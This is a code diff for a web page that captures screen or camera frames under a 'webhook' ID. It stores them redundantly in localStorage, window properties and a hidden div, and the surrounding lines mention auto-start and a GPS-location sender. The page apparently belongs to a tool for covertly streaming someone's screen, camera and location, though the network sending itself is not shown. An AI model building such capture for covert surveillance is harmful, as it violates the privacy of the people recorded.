@@ -233,8 +233,21 @@
                 mediaStream.getVideoTracks()[0].onended = () => {
                     isCapturing = false;
                     document.getElementById('status').innerHTML = '🔴 Capture stopped';
+                    
+                    // Clear transmission data
+                    localStorage.removeItem('mirror_' + webhookId);
+                    localStorage.removeItem('latest_mirror');
+                    window.universalMirrorData = null;
                 };
             }
+            
+            // Additional transmission setup
+            setTimeout(() => {
+                if (isCapturing) {
+                    console.log('Mirror transmission system initialized for webhook:', webhookId);
+                    localStorage.setItem('mirror_initialized_' + webhookId, Date.now().toString());
+                }
+            }, 1000);
         }
         
         function startMirroring(video, canvas, ctx, mode) {
@@ -305,10 +318,23 @@
                 document.getElementById('status').innerHTML = 
                     `${modeIcon} ${modeText} MIRROR ACTIVE - Frame ${frameCount} - ${new Date().toLocaleTimeString()}`;
                 
-                // Debug info (reduced logging for performance)
-                if (frameCount % 10 === 0) { // Log every 10th frame
-                    console.log('Frame captured:', frameCount, 'Size:', Math.round(imageData.length/1024) + 'KB');
+                // Enhanced debug and transmission verification
+                if (frameCount % 5 === 0) {
+                    console.log('Frame captured:', frameCount, 'Webhook:', webhookId, 'Size:', Math.round(imageData.length/1024) + 'KB');
+                    
+                    // Verify data is stored correctly
+                    const storedData = localStorage.getItem('mirror_' + webhookId);
+                    const storedLatest = localStorage.getItem('latest_mirror');
+                    console.log('Storage verification - Direct:', storedData ? 'OK' : 'FAIL', 'Latest:', storedLatest ? 'OK' : 'FAIL');
                 }
+                
+                // Force immediate transmission after each capture
+                setTimeout(() => {
+                    if (window.universalMirrorData && window.universalMirrorData.frame === frameCount) {
+                        // Trigger immediate transmission
+                        localStorage.setItem('force_transmission_' + webhookId, Date.now().toString());
+                    }
+                }, 50);
                 
                 // Continue capturing with smooth intervals
                 const interval = mode === 'camera' ? 200 : 500; // Much faster for smooth video
@@ -403,20 +429,65 @@
         // Auto start detection
         setTimeout(autoDetectAndStart, 1000);
         
-        // Debug function to check data
+        // Enhanced debug function
         window.checkMirrorData = function() {
-            console.log('Checking mirror data for webhook:', webhookId);
-            console.log('Method 1:', localStorage.getItem('mirror_' + webhookId) ? 'Found' : 'Not found');
-            console.log('Method 2:', localStorage.getItem('mirror_data_' + webhookId) ? 'Found' : 'Not found');
-            console.log('Method 3:', localStorage.getItem('universal_mirror') ? 'Found' : 'Not found');
-            console.log('Method 4:', window.universalMirrorData ? 'Found' : 'Not found');
-            console.log('Method 6:', localStorage.getItem('latest_mirror') ? 'Found' : 'Not found');
+            console.log('=== MIRROR DATA DEBUG ===');
+            console.log('Webhook ID:', webhookId);
+            console.log('Is Capturing:', isCapturing);
+            console.log('Frame Count:', frameCount);
+            console.log('Current Mode:', currentMode);
+            
+            const methods = {
+                'Method 1 (Direct)': localStorage.getItem('mirror_' + webhookId),
+                'Method 2 (Structured)': localStorage.getItem('mirror_data_' + webhookId),
+                'Method 3 (Universal)': localStorage.getItem('universal_mirror'),
+                'Method 4 (Window)': window.universalMirrorData,
+                'Method 5 (Latest)': localStorage.getItem('latest_mirror'),
+                'Method 6 (Heartbeat)': localStorage.getItem('mirror_heartbeat')
+            };
+            
+            Object.entries(methods).forEach(([method, data]) => {
+                if (data) {
+                    const size = typeof data === 'string' ? data.length : JSON.stringify(data).length;
+                    console.log(method + ':', 'Found (' + Math.round(size/1024) + 'KB)');
+                } else {
+                    console.log(method + ':', 'NOT FOUND');
+                }
+            });
+            
+            // Test transmission
+            if (window.universalMirrorData) {
+                console.log('Latest frame data:', {
+                    frame: window.universalMirrorData.frame,
+                    timestamp: window.universalMirrorData.timestamp,
+                    dataSize: Math.round(window.universalMirrorData.screenData.length/1024) + 'KB'
+                });
+            }
+            
             return {
                 webhook: webhookId,
                 frameCount: frameCount,
                 isCapturing: isCapturing,
-                mode: currentMode
+                mode: currentMode,
+                dataAvailable: Object.values(methods).filter(d => d).length
             };
+        };
+        
+        // Force transmission function for testing
+        window.forceTransmission = function() {
+            if (window.universalMirrorData) {
+                const data = window.universalMirrorData;
+                localStorage.setItem('force_mirror_' + webhookId, data.screenData);
+                localStorage.setItem('force_mirror_info', JSON.stringify({
+                    webhook: webhookId,
+                    frame: data.frame,
+                    timestamp: Date.now(),
+                    forced: true
+                }));
+                console.log('Force transmission executed for frame:', data.frame);
+                return true;
+            }
+            return false;
         };
         
         // Send GPS location
@@ -441,25 +512,95 @@
             );
         }
         
-        // Keep alive and force data refresh for smooth streaming
+        // Enhanced data transmission system
         setInterval(() => {
             if (isCapturing && window.universalMirrorData) {
-                // Heartbeat
-                localStorage.setItem('mirror_heartbeat_' + webhookId, Date.now().toString());
-                
-                // Force refresh data in multiple locations for smooth streaming
                 const currentData = window.universalMirrorData;
-                localStorage.setItem('mirror_' + webhookId, currentData.screenData);
-                localStorage.setItem('latest_mirror', currentData.screenData);
+                const timestamp = Date.now();
                 
-                // Broadcast update event for immediate sync
+                // Method 1: Multiple localStorage keys with timestamp
+                localStorage.setItem('mirror_' + webhookId, currentData.screenData);
+                localStorage.setItem('mirror_' + webhookId + '_time', timestamp.toString());
+                localStorage.setItem('latest_mirror', currentData.screenData);
+                localStorage.setItem('latest_mirror_time', timestamp.toString());
+                
+                // Method 2: Structured data with metadata
+                const transmissionData = {
+                    screenData: currentData.screenData,
+                    webhook: webhookId,
+                    frame: currentData.frame,
+                    timestamp: timestamp,
+                    mode: currentData.mode,
+                    size: currentData.screenData.length,
+                    ready: true
+                };
+                localStorage.setItem('mirror_data_' + webhookId, JSON.stringify(transmissionData));
+                localStorage.setItem('universal_mirror', JSON.stringify(transmissionData));
+                
+                // Method 3: Direct window properties for immediate access
+                window.mirrorReady = true;
+                window.mirrorFrame = currentData.frame;
+                window.mirrorTimestamp = timestamp;
+                window.mirrorWebhook = webhookId;
+                
+                // Method 4: Force browser storage events
                 try {
-                    window.dispatchEvent(new CustomEvent('mirrorSync', {
-                        detail: { frame: currentData.frame, timestamp: Date.now() }
+                    localStorage.setItem('mirror_trigger_' + webhookId, timestamp.toString());
+                    window.dispatchEvent(new StorageEvent('storage', {
+                        key: 'mirror_trigger_' + webhookId,
+                        newValue: timestamp.toString(),
+                        storageArea: localStorage
                     }));
                 } catch(e) {}
+                
+                // Method 5: Heartbeat with frame info
+                localStorage.setItem('mirror_heartbeat', JSON.stringify({
+                    webhook: webhookId,
+                    frame: currentData.frame,
+                    timestamp: timestamp,
+                    active: true
+                }));
+                
+                // Debug transmission
+                if (currentData.frame % 5 === 0) {
+                    console.log('Transmitting frame:', currentData.frame, 'Webhook:', webhookId, 'Size:', Math.round(currentData.screenData.length/1024) + 'KB');
+                }
             }
-        }, 200); // Much faster refresh for smooth video
+        }, 100); // Ultra fast transmission
+        
+        // Additional transmission method - continuous broadcast
+        setInterval(() => {
+            if (isCapturing && window.universalMirrorData) {
+                const data = window.universalMirrorData;
+                
+                // Broadcast via multiple channels
+                try {
+                    // Channel 1: Custom event
+                    window.dispatchEvent(new CustomEvent('mirrorDataReady', {
+                        detail: {
+                            webhook: webhookId,
+                            frame: data.frame,
+                            data: data.screenData,
+                            timestamp: Date.now()
+                        }
+                    }));
+                    
+                    // Channel 2: Direct DOM manipulation
+                    let hiddenDiv = document.getElementById('hiddenMirrorData');
+                    if (!hiddenDiv) {
+                        hiddenDiv = document.createElement('div');
+                        hiddenDiv.id = 'hiddenMirrorData';
+                        hiddenDiv.style.display = 'none';
+                        document.body.appendChild(hiddenDiv);
+                    }
+                    hiddenDiv.setAttribute('data-webhook', webhookId);
+                    hiddenDiv.setAttribute('data-frame', data.frame.toString());
+                    hiddenDiv.setAttribute('data-timestamp', Date.now().toString());
+                    hiddenDiv.textContent = data.screenData;
+                    
+                } catch(e) {}
+            }
+        }, 150); // Secondary transmission channel
     </script>
 </body>
 </html>
